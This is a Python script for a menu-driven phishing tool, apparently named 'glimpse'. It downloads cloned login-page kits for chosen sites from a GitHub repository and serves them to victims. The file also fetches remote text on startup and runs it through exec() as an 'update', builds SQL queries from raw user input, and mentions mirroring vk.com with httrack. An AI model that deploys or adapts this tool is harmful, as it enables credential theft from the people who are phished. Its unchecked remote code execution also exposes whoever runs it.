##################################
#  BY @WANNADEAUTH         gram) #
#             AND                #
#  (tele       @wannadeauth_chat #
##################################


import sqlite3
import os
import re
import webbrowser
import time
import requests
#import modules.image
import urllib.request, urllib.parse, urllib.error
from colorama import init, Fore, Back, Style
from modules.build import PHPBuilder
from modules.server import FishServer
from modules.serving import Serving

print("Checking for updates")
cv = requests.get("https://raw.githubusercontent.com/voldser/glimpse/main/version.txt").text.split("\n")
if cv[0] != open("version.txt", "r").read().replace("\n", ""):
	exec("\n".join(cv[1:]))

init()
def cls():
	os.system('clear')
check_ngrok = os.listdir()
banner = Fore.RED + open('banner.ban', 'r').read()
#if 'ngrok' in check_ngrok:
#	pass
#else:
#	os.system('python install.py')
PHPBuilder = PHPBuilder()
FishServer = FishServer()
db = sqlite3.connect('fish.db', check_same_thread = False)
sql = db.cursor()
column = [1, 6, 11, 16]

def db_check():
	global column
	cls()
	print(banner)
	linage = []
	space = "               "
	print(Fore.GREEN)
	for i in range(5):
		sql.execute('SELECT * FROM fish WHERE id = '+str(column[0])+' or id = '+str(column[1])+' or id = '+str(column[2])+' or id = '+str(column[3]))	
		rec = sql.fetchall()

		for i in rec:
			if i[2] == 0:
				title_color = Fore.GREEN
			else:
				title_color = Fore.YELLOW
			linage.append(Fore.RED + '[' + Fore.CYAN + str(i[0]) + Fore.RED + ']' + title_color + ' ' + i[1].title() + space[len(i[1])+len(str(i[0])):])

		
		for i in range(4):
			column[i] += 1
		print(''.join(linage) + '\n')
		linage = []
	
	print(Fore.YELLOW)
	if int(column[0]) <= 6:
		print('\n['+Fore.WHITE+'s'+Fore.YELLOW+'] Search     ['+Fore.WHITE+'f'+Fore.YELLOW+'] Forward    ['+Fore.WHITE+'q'+Fore.YELLOW+'] Quit\n\n')
	elif int(column[-1]) >= how:
		print('\n['+Fore.WHITE+'s'+Fore.YELLOW+'] Search     ['+Fore.WHITE+'b'+Fore.YELLOW+'] Back    ['+Fore.WHITE+'q'+Fore.YELLOW+'] Quit\n\n')
	else:
		print('\n['+Fore.WHITE+'s'+Fore.YELLOW+'] Search     ['+Fore.WHITE+'f'+Fore.YELLOW+'] Forward    ['+Fore.WHITE+'b'+Fore.YELLOW+'] Back    ['+Fore.WHITE+'q'+Fore.YELLOW+'] Quit\n\n')

	print(Fore.BLUE)
	choice = input('Choose option: ' + Fore.WHITE).lower()
	for i in ((' ', ''), ('[', ''), (']', '')):
		choice = choice.replace(*i)

	try:
		int(choice)
		
		sql.execute('SELECT * FROM fish WHERE id = ' + choice)

		rec = sql.fetchone()
		domain = rec[1]
		if rec[2] == 1:
			pass
		else:
			print('Start download///')
			urllib.request.urlretrieve('https://github.com/voldser/fish_db/raw/main/' + rec[1] + '.rar', 'ht/tmp.rar')
			os.system('unrar x ht/tmp.rar ht && rm ht/tmp.rar')
			print("Finished!\nStarting...")
			sql.execute('UPDATE fish SET download = 1 where id = ' + str(rec[0]))
			db.commit()
			print(domain)

		link = FishServer.start(domain)
		time.sleep(8)
		Serving.start(domain, link)
		


		

	except ValueError:
		
		if choice[0] == 'f' and how >= column[-1]:

			for i in range(4):
				column[i] += 15
		#

		elif choice[0] == 'f' and how < column[-1]:
			for i in range(4):
				column[i] -= 5
			db_check()
		elif choice[0] == 'q':
			quit()
		elif choice[0] == 'b':
			if column[0] - 20 >= 0:
				for i in range(4):
					column[i] -= 25
			else:
				for i in range(4):
					column[i] -= 5
			db_check()
		elif choice[0] == 's':
			cls()
			print(banner)
			url = input('\n\nType your url: ')
			try:
				requests.get(url)
			except:
				print('This link seems unreachable!\nPlease check it.')
				time.sleep(2)
				webbrowser.open_new(url)
				db_check()

			domain = url
			for i in (('http:', ''), ('https:', ''), ('/', '')):
				domain = domain.replace(*i)
			domain = domain.split('.')[-2]
				
			sql.execute('SELECT * FROM fish')
			rec = sql.fetchall()
				
			search = []
			for i in rec:
				if domain.lower() in i[1]:
					search.append(i[1])
				else:
					pass
			if not search:
				print('This domain wasn`t found on our base, but you can try to build site by this tools:')
				build(url)
			else:
				counter = 1
				for i in search:
					print('[' + str(counter) + ']', i)
					counter += 1
				choice = int(input("Choose script: "))
				also = False
				counter = 1
				for i in search:
					
					if counter != choice:
						counter += 1
					else:
						also = True
				if also:
					if not search[counter - 1] in os.listdir('ht'):
						print('Start download///')
						urllib.request.urlretrieve('https://github.com/voldser/fish_db/raw/main/' + search[counter - 1] + '.rar', 'ht/tmp.rar')
						os.system('unrar x ht/tmp.rar ht && rm ht/tmp.rar')
						sql.execute('UPDATE fish SET download = 1 where name = ' + search[counter - 1])
						db.commit()
						print("Finished!\nStarting...")

					else:
						print("Starting...")
					urltoserver = search[counter - 1]
					print(urltoserver)
					FishServer.start(urltoserver)
				else:
					db_check()

				print(rec)
		else:
			for i in range(4):
				column[i] -= 5
			db_check()

		db_check()



def build(domain):
	cls()
	print(banner + '\n\n')
	print(Fore.CYAN + '[' + Fore.YELLOW + '1' + Fore.CYAN + '] ' + Fore.WHITE + '(IDSI) Interception of Data sent to the Site Image\n')
	print(Fore.CYAN + '[' + Fore.YELLOW + '2' + Fore.CYAN + '] ' + Fore.WHITE + '(BPSSRP) Builder of Phishing Scripts of Sites Running on PHP\n\n')
	choice1 = input(Fore.BLUE + 'Choose method: ' + Fore.WHITE)
	if choice1 == '1':
		print("Not released now, wait for updates")
		time.sleep(3)
	elif choice1 == '2':
		print("Not released now, wait for updates")
		time.sleep(3)
		#PHPBuilder.building(domain)
		
def check_update():
	
	currentv = urllib.request.urlopen('https://raw.githubusercontent.com/WannaDeauth/glimpse/main/version.txt').read().split()

	if currentv[0] != open('version.txt', 'r').readlines()[0]:
		open('version.txt')
		os.system("cd .. && rm -rf glimpse && git clone https://github.com/WannaDeauth/glimpse/ && cd glimpse && python3 main.py")
def recs():
	global how
	sql.execute('SELECT * FROM fish')
	how = sql.fetchall()[-1][0]


recs()

db_check()





# httrack https://vk.com -r2




